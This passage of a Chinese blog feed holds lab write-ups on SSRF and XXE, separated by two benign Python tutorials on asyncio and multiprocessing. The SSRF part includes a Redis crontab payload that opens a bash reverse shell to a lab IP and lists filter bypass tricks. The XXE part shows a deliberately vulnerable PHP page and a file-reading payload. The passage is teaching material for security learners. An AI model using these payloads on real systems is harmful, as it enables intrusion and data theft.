keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n\n[+] &#123;&#125; 发现端口\n\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行脚本</p><pre class="line-numbers language-none"><code class="language-none">~# python3 ssrf_portscan.py[+] 6379 发现端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>通过扫描发现Redis服务的默认端口6373是开放的。</p><p>接下来使用Burp写入shell，注意下面的IP地址为自己nc监听的地址</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;172.18.0.2:6379&#x2F;testset 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.10.30&#x2F;4444 0&gt;&amp;1\n\n\n\n&quot;config set dir &#x2F;etc&#x2F;config set dbfilename crontabsaveaaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果使用 Burp 的话，直接把那几行代码复制到 operator 参数后面就行，就不用URL编码了。</p><p>如果反弹不回 Shell ，在确定各个 IP、端口等参数都没有问题的情况下，Burp 里多点几次几次发送就可以了，我有时候都需要点个几十次才能反弹 Shell ，感觉有些情况下反弹 Shell 是个比较玄学的东西。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x05-绕过技巧"><a href="#0x05-绕过技巧" class="headerlink" title="0x05 绕过技巧"></a>0x05 绕过技巧</h1><p>1、添加端口号：<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p><p>2、短网址绕过：<a href="http://dwz.cn/11SMa">http://dwz.cn/11SMa</a></p><p>3、IP限制绕过：十进制转换、八进制转换、十六进制转换、不同进制组合转换</p><p>4、协议限制绕过：当url协议限制只为http(s)时,可以利用follow redirect特性,构造302跳转服务,结合dict://,file://,gopher://</p><p>5、可以指向任意ip的域名：xip.io</p><p>6、@    <a href="http://abc@127.0.0.1/">http://abc@127.0.0.1</a></p><h1 id="0x06-SSRF防御"><a href="#0x06-SSRF防御" class="headerlink" title="0x06 SSRF防御"></a>0x06 SSRF防御</h1><p>1、过滤返回信息,验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2、统一错误信息,避免用户可以根据错误信息来判断远程服务器的端口状态。</p><p>3、限制请求的端口为http常用的端口,比如80,443,8080,8090</p><p>4、黑名单内网ip。避免应用被用来获取内网数据,攻击内网</p><p>5、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章<br><a href="https://xz.aliyun.com/t/2115">https://xz.aliyun.com/t/2115</a><br><a href="http://www.liuwx.cn/penetrationtest-3.html">http://www.liuwx.cn/penetrationtest-3.html</a><br><a href="https://www.cnblogs.com/yuzly/p/10903398.html">https://www.cnblogs.com/yuzly/p/10903398.html</a><br><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br><a href="https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/">https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 漏洞笔记 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python 学习笔记】 异步IO (asyncio) 协程</title>
      <link href="//191220-161745.html"/>
      <url>//191220-161745.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>之前对协程早有耳闻，但一直没有去学习，今天就来学习一下协程，再次感谢莫烦的教程。</p><p>可以交给asyncio执行的任务被称为协程， asyncio 即异步的意思，在 Python3 中这是一个仅使用单线程就能达到多线程、多进程效果的工具。</p><p>在单线程中使用异步发起 IO 操作的时候，不需要等待 IO 的结束，在等待 IO 操作结束的这个空当儿可以继续做其他事情，结束的时候就会得到通知，所以能够很有效的利用等待下载的这段时间。</p><p>今天就来看看协程能不能干掉多线程和多进程。</p><a id="more"></a><h1 id="0x01-基本用法"><a href="#0x01-基本用法" class="headerlink" title="0x01 基本用法"></a>0x01 基本用法</h1><p>Python 的在 3.4 中引入了协程的概念，3.5 则确定了协程的语法，所以想使用协程处理 IO ，需要Python3.5 及以上的版本，下面是一个简单示例代码。</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import timeimport asyncioasync def job(t):    print(&#39;开始第&#39;, t,&#39;个任务&#39;)    await asyncio.sleep(t)  #等待t秒    print(&#39;第&#39;, t, &#39;个任务执行了&#39;, t, &#39;秒&#39;)    async def main(loop):    tasks &#x3D; [loop.create_task(job(t)) for t in range(1, 4)]     #创建多个任务    await asyncio.wait(tasks)    #运行刚才创建的那些任务if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    start_time &#x3D; time.time()    loop &#x3D; asyncio.get_event_loop()    #创建事件循环    loop.run_until_complete(main(loop))    #运行刚才创建的事件循环    loop.close()    print(&quot;所有总共耗时&quot;, time.time() - start_time)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下：</p><pre class="line-numbers language-none"><code class="language-none">开始第 1 个任务开始第 2 个任务开始第 3 个任务第 1 个任务执行了 1 秒第 2 个任务执行了 2 秒第 3 个任务执行了 3 秒所有总共耗时 3.0029773712158203<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里运行了三个任务，三个任务的执行时间加在一起是6秒，但是最后总共耗时是3秒，接下来就看看协程在爬虫中的使用。</p><h1 id="0x02-aiohttp的使用"><a href="#0x02-aiohttp的使用" class="headerlink" title="0x02 aiohttp的使用"></a>0x02 aiohttp的使用</h1><p>使用 aiohttp 模块可以将 requests 替换成一个异步的 requests ，下面先来看看一般的 requests 的使用，下面的运行结果耗时是我运行了三次，然后取平均数的结果。</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import timeimport requestsdef normal():    for i in range(3):        r &#x3D; requests.get(URL)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:t1 &#x3D; time.time()URL &#x3D; &#39;https:&#x2F;&#x2F;www.teamssix.com&#x2F;&#39;    normal()    print(&quot;正常访问 3 次博客耗费时间&quot;, time.time()-t1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下：</p><pre><code>正常访问 3 次博客耗费时间 12.872265259424845</code></pre><p>正常情况下，花费了近 13 秒，接下来使用 aiohttp 看看耗时多少。</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import timeimport asyncioimport aiohttpasync def job(session):   response &#x3D; await session.get(&#39;https:&#x2F;&#x2F;www.teamssix.com&#x2F;&#39;)       # 等待并切换   return str(response.url)async def main(loop):   async with aiohttp.ClientSession() as session:      # 官网推荐建立 Session 的形式       tasks &#x3D; [loop.create_task(job(session)) for _ in range(3)]       finished, unfinished &#x3D; await asyncio.wait(tasks)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:t1 &#x3D; time.time()loop &#x3D; asyncio.get_event_loop()loop.run_until_complete(main(loop))loop.close()print(&quot;异步访问 3 次博客耗费时间&quot;, time.time() - t1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下：</p><pre class="line-numbers language-none"><code class="language-none">异步访问 3 次博客耗费时间 4.055158615112305<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从运行结果上来看使用 aiohttp 还是很给力的，接下来，看看多线程运行的时间。</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import timeimport threadingimport requestsdef thread_test():    r &#x3D; requests.get(URL)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    t1 &#x3D; time.time()    URL &#x3D; &#39;https:&#x2F;&#x2F;www.teamssix.com&#x2F;&#39;    thread_list &#x3D; []    for i in range(3):        t &#x3D; threading.Thread(target&#x3D;thread_test)        thread_list.append(t)    for i in thread_list:        i.start()    for i in thread_list:        i.join()    print(&quot;多线程访问 3 次博客耗费时间&quot;, time.time()-t1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下：</p><pre class="line-numbers language-none"><code class="language-none">5.449431339899699<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到 aiohttp 的速度还是要略快于多线程的，这里只是简单介绍了一下 aiohttp ，详细的可以参阅<a href="https://docs.python.org/zh-cn/3/library/asyncio.html">官方文档</a>，想要使用的熟练还是需要大量练习，任重道远。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>参考文章：<br><a href="https://www.jianshu.com/p/b5e347b3a17c">https://www.jianshu.com/p/b5e347b3a17c</a><br><a href="https://segmentfault.com/a/1190000008814676">https://segmentfault.com/a/1190000008814676</a><br><a href="https://www.lylinux.net/article/2019/6/9/57.html">https://www.lylinux.net/article/2019/6/9/57.html</a><br><a href="https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-02-asyncio/">https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-02-asyncio/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 协程 </tag>
            
            <tag> 异步IO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python 学习笔记】多进程爬虫</title>
      <link href="//191220-161533.html"/>
      <url>//191220-161533.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前段时间学习了多线程，但在实际的情况中对于多线程的速度实在不满意，所以今天就来学学多进程分布式爬虫，在这里感谢莫烦的Python教程。</p><h1 id="0x01-什么是多进程爬虫"><a href="#0x01-什么是多进程爬虫" class="headerlink" title="0x01 什么是多进程爬虫"></a>0x01 什么是多进程爬虫</h1><p>在讲述多进程之前，先来回顾一下之前学习的多线程。</p><a id="more"></a><p>对于多线程可以简单的理解成运输快递的货车，虽然在整个运输快递的途中有很多货车参与运输，但快递到你手中的时间并不会因为货车的数量增加而变化多少，甚至可能会因为参与运输的货车数量过多，导致送货时间变慢，因为货物在不断的上货卸货。<br>当然现实中可不会有人这么干，然而在计算机的世界里，有时却会犯这种错误，这也就是说多线程并不是越多越好。</p><p>如果有操作系统的基础，则对于线程与进程的理解会更深刻些，这里继续参照上面的例子，对于线程可以简单的理解成一个线程就是一个货车，而一个进程则是一整条快递运输线路上的货车集合，也就是说一个进程包含了多个线程。</p><p>如果在只有一个快递需要运输的时候，使用线程与进程的区别或许不大，但是如果有十件快递、百件快递，使用多进程无疑能够极大的提高效率。</p><h1 id="0x02-准备工作"><a href="#0x02-准备工作" class="headerlink" title="0x02 准备工作"></a>0x02 准备工作</h1><p>在开始学习多进程之前，先来理一下爬虫思路，这里拿爬取我的博客文章举例，首先先用 requests 访问 temassix.com，之后利用 BeautifulSoup 解析出我博客中的文章链接，接着再利用 requests 访问文章，便完成了一个简单的爬虫。</p><p>接下来需要用到的模块：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import time    #测试爬取时间import requestsimport threadingfrom multiprocessing import Process   #多进程模块from bs4 import BeautifulSoup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来需要用到的一些子函数：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">def req_url(url):    r &#x3D; requests.get(url)    #访问url    return(r.text)    #返回htmldef soup_url(html):url_list &#x3D; []soup &#x3D; BeautifulSoup(html, &#39;html.parser&#39;)    #解析返回的htmlfor i in soup.select(&#39;.post-title&#39;):url_list.append(&#39;https:&#x2F;&#x2F;www.teamssix.com&#123;&#125;&#39;.format(i[&#39;href&#39;]))    #拼接博客文章的urlreturn (url_list)    #返回博客文章url数组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x03-测试普通爬取方法"><a href="#0x03-测试普通爬取方法" class="headerlink" title="0x03 测试普通爬取方法"></a>0x03 测试普通爬取方法</h1><p>这里先使用普通爬取的方法，也就是单线程测试一下，为了方便，下面提到的单线程处理方法，准确的来说是单进程单线程，同样的，下面提到的多进程准确的说法是多进程单线程，多线程准确的说则是单进程多线程。</p><p>值得注意的是爬取耗时根据自己的网络情况而定，即使碰到多进程耗时几百秒而单线程耗时几十秒也是正常的，这种情况是因为网络环境较差造成的，所以碰到结果出入很大的时候，可以多试几次，排除偶然性，下面就来上代码。</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:# 开始单线程start_time &#x3D; time.time()url &#x3D; &#39;https:&#x2F;&#x2F;www.teamssix.com&#39;html &#x3D; req_url(url)home_page &#x3D; soup_url(html)for i in home_page:req_url(i)end_time &#x3D; time.time()print(&#39;\n单线程：&#39;,end_time - start_time)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终运行结果如下：</p><pre class="line-numbers language-none"><code class="language-none">单线程： 29.181440114974976<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>单线程花费了 29 秒的时间，接下来使用多进程测试一下</p><h1 id="0x04-测试多进程爬取方法"><a href="#0x04-测试多进程爬取方法" class="headerlink" title="0x04 测试多进程爬取方法"></a>0x04 测试多进程爬取方法</h1><p>通过学习发现多进程的用法和多线程还是挺相似的，所以就直接放代码吧，感兴趣的可以看看参考文章。</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:# 开始多进程start_time &#x3D; time.time()url &#x3D; &#39;https:&#x2F;&#x2F;www.teamssix.com&#39;pool &#x3D; Pool(4)home_page &#x3D; soup_url(req_url(url))for i in home_page:pool.apply_async(req_url, args&#x3D;(i,))pool.close()pool.join()end_time &#x3D; time.time()print(&#39;\n多进程：&#39;,end_time - start_time)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终运行结果如下：</p><pre class="line-numbers language-none"><code class="language-none">多进程： 12.674117088317871<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>多进程仅用了 12 秒就完成了任务，经过多次测试，发现使用多进程基本上能比单线程快2倍以上。</p><p>为了看到多线程与多进程的差距，这里使用多线程处理了一下上面的操作，代码如下：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:#开始多线程start_time &#x3D; time.time()url &#x3D; &#39;https:&#x2F;&#x2F;www.teamssix.com&#39;thread_list &#x3D; []home_page &#x3D; soup_url(req_url(url))for i in home_page:t &#x3D; threading.Thread(target &#x3D; req_url, args&#x3D;(i,))thread_list.append(t)for i in thread_list:i.start()for i in thread_list:i.join()end_time &#x3D; time.time()print(&#39;\n多线程：&#39;, end_time - start_time)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终运行结果如下：</p><pre class="line-numbers language-none"><code class="language-none">多线程： 11.685778141021729<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到这里可能会觉着，这多线程和多进程爬虫的时间也差不多呀，然而事实并非那么简单。</p><p>由于爬虫的大多数时间都耗在了请求等待响应中，所以在爬虫的时候使用多线程好像快了不少，但我以前写过一个笔记：<a href="https://www.teamssix.com/year/191104-101112.html">不一定有效率GIL</a><br>在这篇文章里演示了如果使用单线程和多线程处理密集计算任务，有时多线程反而会比单线程慢了不少，所以接下来就看看多进程处理密集计算任务的表现。</p><h1 id="0x05-处理密集计算任务耗时对比"><a href="#0x05-处理密集计算任务耗时对比" class="headerlink" title="0x05 处理密集计算任务耗时对比"></a>0x05 处理密集计算任务耗时对比</h1><p>直接上代码：</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import time  # 测试爬取时间import threadingfrom multiprocessing import Pooldef math(i):result2 &#x3D; 2 ** i    #执行幂运算if __name__ &#x3D;&#x3D; &#39;__main__&#39;:#开始单线程start_time &#x3D; time.time()for i in range(0, 1000000001, 250000000):math(i)end_time &#x3D; time.time()print(&#39;\n单线程：&#39;,end_time - start_time)#开始多进程start_time &#x3D; time.time()pool &#x3D; Pool(4)for i in range(0, 1000000001, 250000000):pool.apply_async(math, args&#x3D;(i,))pool.close()pool.join()end_time &#x3D; time.time()print(&#39;\n多进程：&#39;,end_time - start_time)# 开始多线程start_time &#x3D; time.time()thread_list &#x3D; []for i in range(0, 1000000001, 250000000):t &#x3D; threading.Thread(target &#x3D; math, args&#x3D;(i,))thread_list.append(t)for i in thread_list:i.start()for i in thread_list:i.join()end_time &#x3D; time.time()print(&#39;\n多线程：&#39;, end_time - start_time)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终运行结果如下：</p><pre class="line-numbers language-none"><code class="language-none">单线程： 20.495169162750244多进程： 11.645867347717285多线程： 22.07299304008484<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过运行结果可以很明显看出，单线程与多线程的耗时差距不大，但是多进程的耗时与之相比几乎快了一倍，所以平时为了提高效率是使用多线程还是多进程，也就很清楚了。</p><p>但如果平时想提高爬虫效率是用多线程还是多进程呢？毕竟他们效率都差不多，那么协程了解一下🧐</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>参考文章：<br><a href="https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-01-distributed-scraping/">https://morvanzhou.github.io/tutorials/data-manipulation/scraping/4-01-distributed-scraping/</a><br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017628290184064">https://www.liaoxuefeng.com/wiki/1016959663602400/1017628290184064</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 多进程 </tag>
            
            <tag> 分布式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】深入浅出学习复现XXE</title>
      <link href="//191209-192903.html"/>
      <url>//191209-192903.html</url>
      
        <content type="html"><![CDATA[<p>声明：文中所使用的环境均为内网环境，本文仅用于学习交流目的，严禁将本文中的技术用于违法犯罪目的。</p><h1 id="0x00-关于XXE"><a href="#0x00-关于XXE" class="headerlink" title="0x00 关于XXE"></a>0x00 关于XXE</h1><h2 id="0、XML是什么"><a href="#0、XML是什么" class="headerlink" title="0、XML是什么"></a>0、XML是什么</h2><p>XXE（XML External Entity Injection）全称为 XML 外部实体注入，XXE的第二个字母 “X” 取自单词 “External” 的第二个字母，很好奇为什么不叫XEE（手动狗头）</p><p>话不多说，让我们进入今天的正题，对于 XXE 想要真正的了解它，就需要先来了解一下XML是什么。</p><blockquote><p>XML（Extensible Markup Language）英文直译就是可扩展标记语言，“标记” 是指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。</p></blockquote><p>如果把 HTML 和 XML 进行对比的话， HTML 旨在显示数据信息，而 XML 旨在传输数据信息。</p><p>XML 也可以理解为一种写法类似于 HTML 语言的数据格式文档，但是 XML 与 HTML 是为不同目的而设计的。</p><blockquote><p>如果感觉听不懂的话也没关系，先有个印象。</p></blockquote><h2 id="1、XML的语言格式规范"><a href="#1、XML的语言格式规范" class="headerlink" title="1、XML的语言格式规范"></a>1、XML的语言格式规范</h2><p>基本上每个语言都有自己的格式规范， XML 当然也不例外， XML 的格式规范是由一个叫做 DTD（Document Type Definition） 的东西控制的。</p><p>这个 DTD 的作用就是去定义 XML 文档的合法构建模块，也就是说声明了 XML 的内容格式规范。</p><p>DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 .dtd 文件。</p><p>下面是一个内部 DTD 的 XML 示例：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!--XML声明--&gt;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!--DTD，文档类型声明--&gt;&lt;!DOCTYPE note [  #定义此文档是note类型&lt;!ELEMENT note (body)&gt;  #定义note元素有一个元素：&quot;body&quot;&lt;!ELEMENT body (#PCDATA)&gt;  #定义body元素为&quot;#PCDATA&quot;类型&lt;!ENTITY writer &quot;hello word&quot;&gt;  #定义一个内部实体]&gt;&lt;!--文档元素--&gt;                                                                         &lt;note&gt;&lt;body&gt;&amp;writer&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面第 7 行中定义了一个内部实体，在第 11 行中对上面定义的 writer 实体进行了引用，到时候输出的时候 &amp;writer 就会被 “hello word” 替换，通过上面的例子，我们可以简单的理解成一个实体其实就是一个变量。</p><p>值得注意的是实体类型分为两种：内部实体和外部实体，上面是内部实体的例子，而今天的重点是外部实体，下面就来看看一个外部实体的例子。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;  #定义元素为ANY，即可以接受任何元素。&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;&lt;root&gt;  &lt;body&gt;&amp;xxe&lt;&#x2F;body&gt;  #定义一个外部实体&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过第 4 行的定义， 第 7 行的 &amp;xxe 就会对 c:/test.dtd 文件资源进行 SYSTEM 关键字的引用，这样对引用资源所做的任何更改都会在文档中自动更新。</p><p>虽然这样做是方便了，但很多时候安全与方便总是矛与盾的关系。</p><p>另外除了上面 SYSTEM 关键字的引用方式，还有一种引用方式是使用 PUBLIC 引用公用 DTD 的方式，语法如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用，但实际上实体远不止这一种，我们以上涉及的实体只是其中的一种，被称为通用实体。</p><p>实体总共有四种，分别是：</p><p>1、内置实体 (Built-in entities)</p><p>2、字符实体 (Character entities)</p><p>3、通用实体 (General entities)</p><p>4、参数实体 (Parameter entities)</p><p>其中内置实体和字符实体都和 HTML 的实体编码类似，但如果从另一个角度看，实体完全可以分成两个派别：通用实体和参数实体。</p><blockquote><p>估计不少人看到这里会感觉有点绕，但没关系，因为这不会影响你对下面内容的理解与复现，感兴趣的可以把上面的内容反复看几遍，或者看看文章尾部的参考文章。</p></blockquote><p>通用实体我们上面已经举了不少例子，下面就来看看参数实体：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; %an-element; %remote-dtd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在上面的代码示例中，可以看到实体名前多了一个 “%” ，在参数实体中使用 “% 实体名” (这里面的空格不能少) 定义，并且只能在 DTD 中使用 “% 实体名” 引用。</p><p>另外和通用实体一样，参数实体也可以外部引用，同时只有在 DTD 文件中，参数实体的声明才能引用其他实体，还需要知道的是参数实体在 Blind XXE 中起到了至关重要的作用。</p><h2 id="2、XML注入"><a href="#2、XML注入" class="headerlink" title="2、XML注入"></a>2、XML注入</h2><p>接下来我们来简单的了解一下XML注入，这部分很容易就能理解。</p><p>在下面是一个普通的XML注入示例：</p><pre class="line-numbers language-none"><code class="language-none">#注入前XML代码&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;&lt;USER role&#x3D;&quot;admin&quot;&gt;用户输入位置&lt;&#x2F;USER&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当用户输入一些恶意代码，比如<code>User1&lt;/USER&gt;&lt;USER role=&quot;admin&quot;&gt;User2</code>，原XML代码就变成了下面的样子：</p><pre class="line-numbers language-none"><code class="language-none">#注入后XML代码&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;&lt;USER role&#x3D;&quot;admin&quot;&gt;User1&lt;&#x2F;USER&gt;&lt;USER role&#x3D;&quot;admin&quot;&gt;User2&lt;&#x2F;USER&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到通过XML语句的前后拼接， XML代码被插入了进去。</p><p>对普通的 XML 注入，利用面比较狭窄，现实中也是比较鸡肋的存在，因此几乎用不到，如果有的话应该也是逻辑漏洞，这个时候XXE就出现了！</p><p>注意，重点来了（敲黑板）</p><h1 id="0x01-XXE的利用"><a href="#0x01-XXE的利用" class="headerlink" title="0x01 XXE的利用"></a>0x01 XXE的利用</h1><h2 id="0、复现环境"><a href="#0、复现环境" class="headerlink" title="0、复现环境"></a>0、复现环境</h2><p>a、目标靶机</p><p>IP：192.168.38.132</p><p>环境：Win7 + phpstudy + apache + php</p><p>b、本地主机</p><p>IP：192.168.10.30</p><p>环境：Win10 +  phpstudy + apache + BurpSuite + Python3</p><blockquote><p>注意：为了便于理解，笔者在部分地方添加了注释，如果读者想要复现文中内容，记得删除注释再使用，避免复现失败。</p></blockquote><h2 id="1、有回显读本地敏感文件-Normal-XXE"><a href="#1、有回显读本地敏感文件-Normal-XXE" class="headerlink" title="1、有回显读本地敏感文件 (Normal XXE)"></a>1、有回显读本地敏感文件 (Normal XXE)</h2><h3 id="xxe-test-php（在靶机）"><a href="#xxe-test-php（在靶机）" class="headerlink" title="xxe_test.php（在靶机）"></a>xxe_test.php（在靶机）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php    libxml_disable_entity_loader (false);    $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);    $dom &#x3D; new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);     $creds &#x3D; simplexml_import_dom($dom);    echo $creds;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在C盘下新建一个flag.txt，内容我设置成了 “XXE Payload Executed Successfully!!!”。</p><h3 id="payload（在本地）"><a href="#payload（在本地）" class="headerlink" title="payload（在本地）"></a>payload（在本地）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE creds [  &lt;!ENTITY goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img 